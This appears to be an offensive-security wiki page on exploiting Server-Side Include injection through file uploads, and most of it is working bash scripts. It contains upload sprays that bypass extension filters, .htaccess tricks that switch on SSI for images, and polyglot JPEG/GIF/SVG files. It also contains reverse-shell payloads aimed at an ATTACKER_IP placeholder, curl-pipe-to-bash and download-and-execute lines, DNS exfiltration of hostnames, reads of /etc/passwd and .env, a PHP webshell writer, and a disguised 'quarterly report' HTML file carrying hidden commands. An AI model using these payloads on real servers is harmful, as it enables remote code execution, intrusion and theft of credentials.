---
title: Server-Side Include (SSI) Upload
description: Server-Side Include Upload — Exploit SSI Directive Injection via File Upload for Remote Code Execution
navigation:
  icon: i-lucide-file-terminal
  title: SSI Upload Exploitation
---

## Server-Side Include (SSI) Upload

::badge
**Critical Severity — CWE-97 / CWE-434 / CWE-78**
::

Server-Side Includes (SSI) are directives embedded in HTML pages that the web server processes **before** sending the response to the client. When a web server has SSI enabled and an attacker can upload files with SSI-processed extensions (`.shtml`, `.stm`, `.shtm`) — or inject SSI directives into files that are subsequently parsed — they can execute arbitrary operating system commands, include other files, manipulate environment variables, and achieve full Remote Code Execution without uploading a traditional webshell.

::note
SSI is often overlooked in bug bounty because it's considered "legacy technology." But Apache, Nginx, IIS, and LiteSpeed all support SSI, and it's still enabled by default on many servers. The key advantage of SSI exploitation over PHP/JSP shells is that SSI directives look like HTML comments — `<!--#exec cmd="id"-->` — making them trivially easy to embed in otherwise legitimate HTML, SVG, or text files and nearly invisible to content filters that scan for PHP/ASP/JSP tags.
::

SSI directives execute at the **web server level**, not the application level. This means they run with the privileges of the web server process (typically `www-data`, `apache`, or `nginx`) and bypass application-layer security controls. The server processes SSI before any application framework sees the content, creating a pre-application execution layer.

---

## Understanding SSI

### How SSI Processing Works

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="The SSI Processing Pipeline"}
  ```text
  CLIENT REQUEST:
    GET /uploads/report.shtml HTTP/1.1
         ↓
  WEB SERVER (Apache/Nginx/IIS):
    1. Receives request for .shtml file
    2. Checks handler configuration:
       - Apache: AddHandler server-parsed .shtml
       - Nginx: ssi on;
       - IIS: #exec enabled in SSI configuration
    3. Opens the file and scans for SSI directives
    4. Finds: <!--#exec cmd="id"-->
    5. Executes the command: /bin/sh -c "id"
    6. Replaces the directive with command output
    7. Returns processed HTML to client
         ↓
  CLIENT RESPONSE:
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

  **Critical detail:** SSI processing happens at the web server layer — BEFORE the application framework (PHP, Python, Node.js) processes the request. This means:
  - SSI runs even if the application framework has no vulnerabilities
  - SSI bypasses application-level WAFs that only inspect after routing
  - SSI runs with web server user privileges
  - SSI can execute system commands directly
  :::

  :::accordion-item{icon="i-lucide-layers" label="SSI Directive Reference"}
  | Directive | Syntax | Purpose | Impact |
  | --------- | ------ | ------- | ------ |
  | `exec cmd` | `<!--#exec cmd="command"-->` | Execute OS command | **RCE** |
  | `exec cgi` | `<!--#exec cgi="/cgi-bin/script"-->` | Execute CGI script | **RCE** |
  | `include virtual` | `<!--#include virtual="/path"-->` | Include another URL | File read, SSRF |
  | `include file` | `<!--#include file="path"-->` | Include local file | File read |
  | `echo var` | `<!--#echo var="VARIABLE"-->` | Print environment variable | Info disclosure |
  | `set var` | `<!--#set var="name" value="val"-->` | Set variable | Variable manipulation |
  | `config` | `<!--#config timefmt="%Y"-->` | Configure SSI behavior | Config manipulation |
  | `fsize` | `<!--#fsize file="path"-->` | Print file size | Path enumeration |
  | `flastmod` | `<!--#flastmod file="path"-->` | Print last modified time | Path enumeration |
  | `if/elif/else/endif` | `<!--#if expr="..."-->` | Conditional logic | Logic bypass |
  | `printenv` | `<!--#printenv-->` | Print all environment variables | Full env disclosure |
  :::

  :::accordion-item{icon="i-lucide-target" label="Server-Specific SSI Configuration"}
  **Apache (most common):**
  ```apache
  # httpd.conf / .htaccess
  Options +Includes
  AddType text/html .shtml
  AddOutputFilter INCLUDES .shtml
  # Or for all HTML files:
  AddHandler server-parsed .html .htm .shtml .stm .shtm
  ```

  **Nginx:**
  ```nginx
  location / {
      ssi on;
      ssi_types text/html;  # Can be extended to other types
  }
  ```

  **IIS:**
  ```text
  # Enabled via Server Manager → Web Server → Application Development → SSI
  # Or in applicationHost.config:
  <serverSideInclude ssiExecDisable="false" />
  ```

  **LiteSpeed:**
  ```text
  # Supports SSI via Apache-compatible configuration
  # Usually inherits Apache's .htaccess directives
  ```
  :::
::

---

## Reconnaissance — Detecting SSI Support

### SSI Detection Techniques

::tabs
  :::tabs-item{icon="i-lucide-radar" label="SSI Extension & Handler Detection"}
  ```bash
  TARGET="https://target.com"

  echo "═══ SSI Support Detection ═══"

  # ── Check if SSI extensions return different responses than 404 ──
  echo "─── Extension Handler Detection ───"
  for ext in shtml stm shtm html htm; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/nonexistent_ssi_test.${ext}" --max-time 5 2>/dev/null)
      case $STATUS in
          403) echo "  [HANDLER] .${ext} → 403 (exists, access denied — handler active)" ;;
          500) echo "  [HANDLER] .${ext} → 500 (SSI processing attempted)" ;;
          200) echo "  [CHECK]   .${ext} → 200 (may process SSI directives)" ;;
          404) ;; # Standard
          *) echo "  [?]       .${ext} → ${STATUS}" ;;
      esac
  done

  # ── Check for existing .shtml files ──
  echo ""
  echo "─── Existing SSI Files ───"
  for path in \
      "/index.shtml" "/default.shtml" "/home.shtml" \
      "/error.shtml" "/404.shtml" "/500.shtml" \
      "/header.shtml" "/footer.shtml" "/menu.shtml" \
      "/includes/header.shtml" "/includes/footer.shtml" \
      "/test.shtml" "/info.shtml"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}" --max-time 3 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "  [+] Found: ${path}"
  done

  # ── Check Apache SSI configuration via .htaccess ──
  echo ""
  echo "─── Apache SSI Config Indicators ───"
  for path in "/.htaccess" "/uploads/.htaccess" "/includes/.htaccess"; do
      CONTENT=$(curl -s "${TARGET}${path}" --max-time 3 2>/dev/null)
      if echo "$CONTENT" | grep -qi "includes\|server-parsed\|AddHandler.*shtml\|AddOutputFilter"; then
          echo "  [+] SSI config in: ${path}"
          echo "$CONTENT" | grep -i "includes\|server-parsed\|shtml" | head -5 | sed 's/^/      /'
      fi
  done

  # ── Server identification ──
  echo ""
  echo "─── Server Type ───"
  curl -sI "$TARGET" | grep -iE "^server:" | head -1
  echo ""
  echo "[*] SSI Support by Server:"
  echo "    Apache: Options +Includes, AddHandler server-parsed .shtml"
  echo "    Nginx:  ssi on; in location block"
  echo "    IIS:    Server-side includes enabled in features"
  echo "    LiteSpeed: Apache-compatible SSI"
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Active SSI Testing (Upload-Based)"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  TARGET="https://target.com"

  echo "═══ Active SSI Testing via Upload ═══"

  # ── Step 1: Test if .shtml extensions are accepted ──
  echo "─── Extension Acceptance ───"

  SSI_PAYLOAD='<!--#echo var="SERVER_SOFTWARE"-->'
  echo "$SSI_PAYLOAD" > /tmp/ssi_test.txt

  for ext in shtml stm shtm html htm xhtml; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ssi_test.txt;filename=test.${ext}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # ── Step 2: Upload and check if SSI is processed ──
  echo ""
  echo "─── SSI Processing Test ───"

  # Create test file with echo directive (safest, info-only)
  cat > /tmp/ssi_detect.shtml << 'EOF'
  <html>
  <body>
  SSI_MARKER_START
  <!--#echo var="SERVER_SOFTWARE"-->
  SSI_MARKER_END
  </body>
  </html>
  EOF

  RESP=$(curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/ssi_detect.shtml;filename=detect.shtml;type=text/html" \
    -H "Cookie: $COOKIE" 2>/dev/null)

  echo "[*] Upload response: $(echo "$RESP" | head -c 100)"

  # Access the uploaded file and check if SSI was processed
  for dir in uploads files media content static; do
      BODY=$(curl -s "${TARGET}/${dir}/detect.shtml" --max-time 5 2>/dev/null)
      if echo "$BODY" | grep -q "SSI_MARKER_START"; then
          echo ""
          echo "[*] File found at: ${TARGET}/${dir}/detect.shtml"

          # Check if SSI directive was processed
          BETWEEN=$(echo "$BODY" | sed -n '/SSI_MARKER_START/,/SSI_MARKER_END/p')

          if echo "$BETWEEN" | grep -qi "apache\|nginx\|iis\|litespeed"; then
              echo "[!!!] SSI IS PROCESSING — Server info returned!"
              echo "      Server: $(echo "$BETWEEN" | grep -viE 'MARKER|echo|--' | tr -d '\n' | head -c 100)"
          elif ! echo "$BETWEEN" | grep -q '<!--#echo'; then
              echo "[!!!] SSI directive was CONSUMED (not visible in output)"
              echo "      SSI is likely processing but echo var returned empty"
          else
              echo "[*] SSI directive visible in output — NOT processed"
              echo "    SSI may not be enabled for this path"
          fi
          break
      fi
  done

  rm -f /tmp/ssi_test.txt /tmp/ssi_detect.shtml
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="SSI via .htaccess Enable"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  TARGET="https://target.com"

  echo "═══ Enable SSI via .htaccess Upload ═══"

  # If .htaccess upload is possible, enable SSI for the upload directory
  cat > /tmp/ssi_htaccess << 'EOF'
  Options +Includes
  AddType text/html .shtml .stm .shtm .jpg .txt .html
  AddHandler server-parsed .shtml .stm .shtm .jpg .txt .html
  AddOutputFilter INCLUDES .shtml .stm .shtm .jpg .txt .html
  EOF

  echo "[*] Uploading .htaccess to enable SSI..."

  for name in ".htaccess" ".Htaccess" ".HTACCESS" ".htaccess."; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/ssi_htaccess;filename=${name}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${name} uploaded successfully"
  done

  # Now upload SSI payload as .txt or .jpg (enabled by .htaccess)
  echo '<!--#exec cmd="id"-->' > /tmp/ssi_as_txt.txt
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_as_txt.txt;filename=test.txt;type=text/plain" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  [ "$STATUS" = "200" ] && echo "[+] SSI payload uploaded as .txt"

  echo '<!--#exec cmd="id"-->' > /tmp/ssi_as_jpg.txt
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_as_jpg.txt;filename=cmd.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  [ "$STATUS" = "200" ] && echo "[+] SSI payload uploaded as .jpg"

  # Check execution
  echo ""
  echo "─── Checking SSI execution ───"
  for dir in uploads files; do
      for f in test.txt cmd.jpg; do
          RESULT=$(curl -s "${TARGET}/${dir}/${f}" --max-time 5 2>/dev/null)
          if echo "$RESULT" | grep -q "uid="; then
              echo "[!!!] SSI RCE via .htaccess chain!"
              echo "      URL: ${TARGET}/${dir}/${f}"
              echo "      Output: $(echo "$RESULT" | grep 'uid=' | head -1)"
          fi
      done
  done

  rm -f /tmp/ssi_htaccess /tmp/ssi_as_txt.txt /tmp/ssi_as_jpg.txt
  ```
  :::
::

---

## Payload Crafting

### SSI Command Execution Payloads

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic exec cmd Payloads"}
  ```bash
  # ═══════════════════════════════════════════════
  # Core SSI command execution directives
  # These look like HTML comments — nearly invisible to filters
  # ═══════════════════════════════════════════════

  echo "═══ SSI Payload Generation ═══"

  # ── Minimal RCE ──
  cat > ssi_id.shtml << 'EOF'
  <!--#exec cmd="id"-->
  EOF

  # ── Whoami ──
  cat > ssi_whoami.shtml << 'EOF'
  <!--#exec cmd="whoami"-->
  EOF

  # ── System info ──
  cat > ssi_info.shtml << 'EOF'
  <html><body>
  <h1>System Information</h1>
  <pre>
  User: <!--#exec cmd="id"-->
  Hostname: <!--#exec cmd="hostname"-->
  OS: <!--#exec cmd="uname -a"-->
  Kernel: <!--#exec cmd="cat /etc/os-release | head -3"-->
  IP: <!--#exec cmd="hostname -I"-->
  </pre>
  </body></html>
  EOF

  # ── File read ──
  cat > ssi_read_passwd.shtml << 'EOF'
  <pre><!--#exec cmd="cat /etc/passwd"--></pre>
  EOF

  cat > ssi_read_env.shtml << 'EOF'
  <pre><!--#exec cmd="cat /var/www/html/.env 2>/dev/null || echo 'No .env found'"--></pre>
  EOF

  # ── Directory listing ──
  cat > ssi_ls.shtml << 'EOF'
  <pre><!--#exec cmd="ls -la /var/www/html/"--></pre>
  EOF

  # ── Network info ──
  cat > ssi_network.shtml << 'EOF'
  <pre>
  <!--#exec cmd="ip addr 2>/dev/null || ifconfig"-->
  ---
  <!--#exec cmd="ss -tlnp 2>/dev/null || netstat -tlnp"-->
  ---
  <!--#exec cmd="cat /etc/hosts"-->
  </pre>
  EOF

  # ── Parameterized shell (use query string) ──
  # Note: SSI can access QUERY_STRING environment variable
  cat > ssi_shell.shtml << 'EOF'
  <!--#set var="cmd" value="$QUERY_STRING"-->
  <pre><!--#exec cmd="$cmd"--></pre>
  EOF

  # ── Alternative: exec cgi ──
  cat > ssi_cgi.shtml << 'EOF'
  <!--#exec cgi="/cgi-bin/env.cgi"-->
  EOF

  echo "[+] SSI payloads created:"
  ls -la ssi_*.shtml
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shell Payloads"}
  ```bash
  ATTACKER_IP="10.10.14.1"
  ATTACKER_PORT="4444"

  # ── Bash reverse shell via SSI ──
  cat > ssi_revshell_bash.shtml << SSIEOF
  <!--#exec cmd="bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'"-->
  SSIEOF

  # ── Python reverse shell ──
  cat > ssi_revshell_python.shtml << SSIEOF
  <!--#exec cmd="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${ATTACKER_IP}\",${ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"-->
  SSIEOF

  # ── Perl reverse shell ──
  cat > ssi_revshell_perl.shtml << SSIEOF
  <!--#exec cmd="perl -e 'use Socket;\$i=\"${ATTACKER_IP}\";\$p=${ATTACKER_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'"-->
  SSIEOF

  # ── Netcat reverse shell ──
  cat > ssi_revshell_nc.shtml << SSIEOF
  <!--#exec cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ATTACKER_IP} ${ATTACKER_PORT} >/tmp/f"-->
  SSIEOF

  # ── Curl + execute ──
  cat > ssi_revshell_curl.shtml << SSIEOF
  <!--#exec cmd="curl http://${ATTACKER_IP}:8080/shell.sh | bash"-->
  SSIEOF

  echo "[+] Reverse shell SSI payloads created"
  echo "[*] Start listener: nc -lvnp ${ATTACKER_PORT}"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Information Disclosure Payloads"}
  ```bash
  # ═══════════════════════════════════════════════
  # SSI information disclosure — no command execution needed
  # Uses #echo, #include, #printenv directives
  # These may work even when #exec is disabled
  # ═══════════════════════════════════════════════

  # ── Print all environment variables ──
  cat > ssi_printenv.shtml << 'EOF'
  <html><body>
  <h1>Server Environment</h1>
  <pre><!--#printenv--></pre>
  </body></html>
  EOF

  # ── Specific environment variables ──
  cat > ssi_env_vars.shtml << 'EOF'
  <pre>
  SERVER_SOFTWARE: <!--#echo var="SERVER_SOFTWARE"-->
  SERVER_NAME: <!--#echo var="SERVER_NAME"-->
  SERVER_ADDR: <!--#echo var="SERVER_ADDR"-->
  SERVER_PORT: <!--#echo var="SERVER_PORT"-->
  SERVER_PROTOCOL: <!--#echo var="SERVER_PROTOCOL"-->
  DOCUMENT_ROOT: <!--#echo var="DOCUMENT_ROOT"-->
  SERVER_ADMIN: <!--#echo var="SERVER_ADMIN"-->
  SCRIPT_FILENAME: <!--#echo var="SCRIPT_FILENAME"-->
  REMOTE_ADDR: <!--#echo var="REMOTE_ADDR"-->
  HTTP_HOST: <!--#echo var="HTTP_HOST"-->
  HTTP_USER_AGENT: <!--#echo var="HTTP_USER_AGENT"-->
  QUERY_STRING: <!--#echo var="QUERY_STRING"-->
  REQUEST_URI: <!--#echo var="REQUEST_URI"-->
  DATE_LOCAL: <!--#echo var="DATE_LOCAL"-->
  LAST_MODIFIED: <!--#echo var="LAST_MODIFIED"-->
  </pre>
  EOF

  # ── Include local files (alternative to exec) ──
  cat > ssi_include_passwd.shtml << 'EOF'
  <pre><!--#include virtual="/etc/passwd"--></pre>
  EOF

  cat > ssi_include_hosts.shtml << 'EOF'
  <pre><!--#include file="/etc/hosts"--></pre>
  EOF

  # ── File size / modification time (path probing) ──
  cat > ssi_fsize.shtml << 'EOF'
  /etc/passwd size: <!--#fsize file="/etc/passwd"-->
  /etc/shadow size: <!--#fsize file="/etc/shadow"-->
  .env size: <!--#fsize virtual="/.env"-->
  wp-config.php size: <!--#fsize virtual="/wp-config.php"-->
  EOF

  # ── Conditional SSI (test file existence) ──
  cat > ssi_conditional.shtml << 'EOF'
  <!--#if expr="-f /etc/passwd"-->
  /etc/passwd EXISTS
  <!--#else-->
  /etc/passwd NOT FOUND
  <!--#endif-->

  <!--#if expr="-f /var/www/html/.env"-->
  .env EXISTS
  <!--#else-->
  .env NOT FOUND
  <!--#endif-->

  <!--#if expr="-f /var/www/html/wp-config.php"-->
  WordPress detected
  <!--#endif-->
  EOF

  echo "[+] Information disclosure SSI payloads created"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Advanced & Chained Payloads"}
  ```bash
  # ═══════════════════════════════════════════════
  # Advanced SSI techniques: variable manipulation,
  # conditional execution, and chained commands
  # ═══════════════════════════════════════════════

  # ── Parameterized command execution via QUERY_STRING ──
  # Access: /uploads/shell.shtml?id
  # Access: /uploads/shell.shtml?cat%20/etc/passwd
  cat > ssi_interactive_shell.shtml << 'EOF'
  <html>
  <head><title>Report Viewer</title></head>
  <body>
  <h1>Document Processing</h1>
  <!--#if expr="$QUERY_STRING"-->
  <pre><!--#exec cmd="$QUERY_STRING"--></pre>
  <!--#else-->
  <p>Loading document... Please wait.</p>
  <!--#endif-->
  </body>
  </html>
  EOF

  # ── Write persistent webshell via SSI ──
  cat > ssi_write_shell.shtml << 'EOF'
  <!--#exec cmd="echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/uploads/persistent.php"-->
  <!--#exec cmd="echo 'Shell written' "-->
  EOF

  # ── Download and execute remote script ──
  cat > ssi_download_exec.shtml << 'SSIEOF'
  <!--#exec cmd="curl -s http://ATTACKER_IP:8080/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh"-->
  SSIEOF

  # ── Exfiltrate data via DNS ──
  COLLAB="YOUR_COLLAB_ID.oastify.com"
  cat > ssi_exfil_dns.shtml << SSIEOF
  <!--#exec cmd="nslookup \$(whoami).ssi.${COLLAB}"-->
  <!--#exec cmd="nslookup \$(hostname).ssi.${COLLAB}"-->
  SSIEOF

  # ── Multi-command chaining ──
  cat > ssi_multi_cmd.shtml << 'EOF'
  <html><body>
  <h2>System</h2>
  <pre><!--#exec cmd="id && hostname && uname -a"--></pre>
  <h2>Network</h2>
  <pre><!--#exec cmd="ip addr 2>/dev/null | grep inet; echo '---'; cat /etc/hosts"--></pre>
  <h2>Files</h2>
  <pre><!--#exec cmd="find /var/www -name '*.conf' -o -name '*.env' -o -name '*.config' 2>/dev/null | head -20"--></pre>
  <h2>Processes</h2>
  <pre><!--#exec cmd="ps aux | head -30"--></pre>
  </body></html>
  EOF

  # ── SSI XSS (if exec is disabled but echo works) ──
  cat > ssi_xss_echo.shtml << 'EOF'
  <!--#set var="xss" value="<script>alert(document.domain)</script>"-->
  <!--#echo var="xss" encoding="none"-->
  EOF

  echo "[+] Advanced SSI payloads created"
  ```
  :::
::

### SSI in Non-SHTML Files

::accordion
  :::accordion-item{icon="i-lucide-file" label="SSI in Image Files (Via .htaccess)"}
  ```bash
  # If .htaccess can be uploaded, enable SSI for image extensions
  # Then SSI directives in .jpg/.png/.gif files get processed

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # Stage 1: .htaccess enabling SSI for images
  cat > /tmp/ssi_htaccess << 'EOF'
  Options +Includes
  AddHandler server-parsed .jpg .jpeg .png .gif .txt .html .svg
  AddOutputFilter INCLUDES .jpg .jpeg .png .gif .txt .html .svg
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_htaccess;filename=.htaccess" \
    -H "Cookie: $COOKIE"

  # Stage 2: SSI directives in image files
  # JPEG with SSI (magic bytes + SSI)
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/ssi_as_jpg
  echo '<!--#exec cmd="id"-->' >> /tmp/ssi_as_jpg

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_as_jpg;filename=photo.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # GIF with SSI
  echo -n 'GIF89a<!--#exec cmd="id"-->' > /tmp/ssi_as_gif

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_as_gif;filename=avatar.gif;type=image/gif" \
    -H "Cookie: $COOKIE"

  # Plain text with SSI
  echo '<!--#exec cmd="id"-->' > /tmp/ssi_as_txt

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_as_txt;filename=readme.txt;type=text/plain" \
    -H "Cookie: $COOKIE"

  # SVG with SSI (SVG is XML, so SSI comments may be processed)
  cat > /tmp/ssi_as_svg << 'EOF'
  <?xml version="1.0"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="10" y="50"><!--#exec cmd="id"--></text>
  </svg>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_as_svg;filename=icon.svg;type=image/svg+xml" \
    -H "Cookie: $COOKIE"

  # Verify
  echo ""
  echo "─── Checking SSI execution in non-SHTML files ───"
  for dir in uploads files; do
      for f in photo.jpg avatar.gif readme.txt icon.svg; do
          RESULT=$(curl -s "https://target.com/${dir}/${f}" --max-time 5 2>/dev/null)
          if echo "$RESULT" | grep -q "uid="; then
              echo "[!!!] SSI executed in ${f}: https://target.com/${dir}/${f}"
          fi
      done
  done

  rm -f /tmp/ssi_htaccess /tmp/ssi_as_jpg /tmp/ssi_as_gif /tmp/ssi_as_txt /tmp/ssi_as_svg
  ```
  :::

  :::accordion-item{icon="i-lucide-file" label="SSI via EXIF Metadata + LFI"}
  ```bash
  # Inject SSI directives into EXIF metadata
  # If the image is later included via LFI with SSI processing,
  # the directives execute

  # Create valid image
  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'red').save('ssi_exif.jpg','JPEG',quality=95)" 2>/dev/null

  # Inject SSI into EXIF fields
  exiftool \
    -Comment='<!--#exec cmd="id"-->' \
    -ImageDescription='<!--#exec cmd="whoami"-->' \
    -Artist='<!--#exec cmd="cat /etc/passwd | head -3"-->' \
    -Copyright='<!--#exec cmd="uname -a"-->' \
    -overwrite_original ssi_exif.jpg

  echo "[+] ssi_exif.jpg — valid JPEG with SSI in EXIF"
  strings ssi_exif.jpg | grep "exec cmd" | wc -l | xargs -I{} echo "    {} SSI directives embedded"

  # Upload
  curl -X POST "https://target.com/api/upload" \
    -F "file=@ssi_exif.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  # If SSI is enabled and the file is accessed/included:
  echo "[*] Access directly: https://target.com/uploads/ssi_exif.jpg"
  echo "[*] Or chain with LFI: ?page=../uploads/ssi_exif.jpg"
  ```
  :::

  :::accordion-item{icon="i-lucide-file" label="SSI in HTML Upload (Stored XSS + RCE)"}
  ```bash
  # If the application allows HTML file uploads
  # and the server has SSI enabled for .html files,
  # SSI directives in the HTML execute server-side

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # Innocent-looking HTML report with hidden SSI
  cat > ssi_report.html << 'EOF'
  <!DOCTYPE html>
  <html>
  <head><title>Quarterly Report</title></head>
  <body>
  <h1>Q4 2024 Performance Report</h1>
  <p>Revenue increased by 15% compared to Q3.</p>

  <!-- Legitimate-looking comment hiding SSI -->
  <div style="display:none">
  <!--#exec cmd="id > /var/www/html/uploads/ssi_proof.txt"-->
  <!--#exec cmd="cat /etc/passwd > /var/www/html/uploads/ssi_passwd.txt"-->
  </div>

  <h2>Key Metrics</h2>
  <table>
  <tr><td>Customers</td><td><!--#exec cmd="echo 12847"--></td></tr>
  <tr><td>Server</td><td><!--#echo var="SERVER_SOFTWARE"--></td></tr>
  </table>

  <p>Generated: <!--#echo var="DATE_LOCAL"--></p>
  </body>
  </html>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "file=@ssi_report.html;filename=q4_report.html;type=text/html" \
    -H "Cookie: $COOKIE"

  echo "[+] Uploaded ssi_report.html"
  echo "[*] If SSI is enabled for .html, visiting the page executes commands"
  echo "[*] Check: https://target.com/uploads/ssi_proof.txt"
  echo "[*] Check: https://target.com/uploads/ssi_passwd.txt"
  ```
  :::
::

---

## Upload Delivery & Exploitation

### Systematic Upload Testing

::tabs
  :::tabs-item{icon="i-lucide-upload" label="SSI Extension Spray"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  COLLAB="YOUR_COLLAB_ID.oastify.com"

  # SSI payload with DNS callback (safe detection)
  SSI_PAYLOAD="<!--#exec cmd=\"nslookup ssi-test.${COLLAB}\"-->"

  echo "$SSI_PAYLOAD" > /tmp/ssi_spray.txt

  echo "═══ SSI Extension Upload Spray ═══"

  # Direct SSI extensions
  echo "─── Direct Extensions ───"
  for ext in shtml stm shtm; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ssi_spray.txt;filename=test.${ext};type=text/html" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # Case variations
  echo "─── Case Variations ───"
  for ext in SHTML Shtml sHtml shTml shtMl shtmlSHTM STM Stm; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ssi_spray.txt;filename=test.${ext}" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # HTML variants (SSI often processes .html too)
  echo "─── HTML Extensions ───"
  for ext in html htm xhtml mhtml hta; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ssi_spray.txt;filename=test.${ext}" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # Double extensions
  echo "─── Double Extensions ───"
  for combo in shtml.jpg jpg.shtml shtml.png shtml.txt html.jpg; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ssi_spray.txt;filename=test.${combo}" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${combo} ACCEPTED"
  done

  # Content-Type variations
  echo "─── Content-Type Spray ───"
  for ct in "text/html" "text/plain" "image/jpeg" "application/octet-stream" "text/xml"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ssi_spray.txt;filename=test.shtml;type=${ct}" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .shtml + CT:${ct} ACCEPTED"
  done

  echo ""
  echo "[*] Check ${COLLAB} for 'ssi-test' DNS callbacks"

  rm -f /tmp/ssi_spray.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Trigger & Verify SSI Execution"}
  ```bash
  TARGET="https://target.com"
  COLLAB="YOUR_COLLAB_ID.oastify.com"

  echo "═══ SSI Execution Verification ═══"

  # ── Method 1: Response-based detection ──
  echo "─── Response-Based ───"

  for dir in uploads files media content static; do
      for ext in shtml html htm stm txt jpg; do
          URL="${TARGET}/${dir}/test.${ext}"
          RESULT=$(curl -s "$URL" --max-time 5 2>/dev/null)

          # Check for command output
          if echo "$RESULT" | grep -qE "uid=[0-9]+|root:|www-data|apache|nginx"; then
              echo "[!!!] SSI RCE: ${URL}"
              echo "      Output: $(echo "$RESULT" | grep -oE 'uid=[^ ]+' | head -1)"
          fi

          # Check for environment variables (echo directive worked)
          if echo "$RESULT" | grep -qiE "apache|nginx|iis|litespeed" && ! echo "$RESULT" | grep -q "SERVER_SOFTWARE"; then
              echo "[+]   SSI echo works: ${URL} (server info returned)"
          fi

          # Check if SSI directive was consumed (not visible but also no output)
          if [ -n "$RESULT" ] && ! echo "$RESULT" | grep -q '<!--#'; then
              if echo "$RESULT" | grep -q "SSI_MARKER\|test" 2>/dev/null; then
                  echo "[~]   SSI may be processing: ${URL} (directives consumed)"
              fi
          fi
      done
  done

  # ── Method 2: OOB DNS verification ──
  echo ""
  echo "─── OOB Verification ───"

  SSI_OOB="<!--#exec cmd=\"nslookup ssi-verify.${COLLAB}\"-->"
  echo "$SSI_OOB" > /tmp/ssi_oob.shtml

  curl -s -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/ssi_oob.shtml;filename=verify.shtml;type=text/html" \
    -H "Cookie: session=TOKEN"

  # Access it to trigger
  for dir in uploads files; do
      curl -s "${TARGET}/${dir}/verify.shtml" --max-time 5 &>/dev/null
  done

